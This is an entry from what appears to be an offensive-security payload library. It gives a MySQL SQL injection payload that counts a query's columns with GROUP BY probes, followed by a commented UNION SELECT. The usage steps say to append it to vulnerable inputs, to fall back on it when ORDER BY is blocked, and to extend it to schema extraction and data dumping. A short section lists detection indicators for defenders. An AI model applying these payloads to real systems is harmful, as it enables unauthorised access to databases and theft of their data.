---
id: 14c33697-7cc0-4e1c-b7a8-c0d5bb166acd
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:34.233753+00:00'
updated_at: '2023-04-10T20:22:49.057957+00:00'
tags:
  - mysql-injection
  - column-enumeration
  - group-by
platforms:
  - Web
  - MySQL
validated: true
---

# MySQL-GROUP-BY-Column-Enumeration-Payload

## Code

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
                    #-1' UNION SELECT 1,2,3--+    True
```

## Description

This SQL payload leverages the GROUP BY clause to enumerate columns in a MySQL query via SQL injection. It groups results by column position, succeeding until the count exceeds the query's columns, causing an error. The included UNION SELECT verifies the structure for subsequent attacks like data dumping.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| N (in GROUP BY N) | Column position to group by (increment sequentially) | 1, 2, 3, 4 |

## Usage

Append to a SQLi-vulnerable input (e.g., ?search=1' GROUP BY N--+). Probe incrementally to find the column limit through response differences. Use as a fallback if ORDER BY is blocked. After confirmation, extend with UNION to inject payloads for schema extraction.

## Detection

- Logs of GROUP BY queries with positional arguments or unusual comment terminators (--+) in user input.
- Behavioral monitoring for aggregation errors or unexpected query groupings.
- Intrusion detection on UNION patterns following GROUP BY probes.

## Related

- [[procedures/MySQL-Union-Based-Column-Enumeration]]
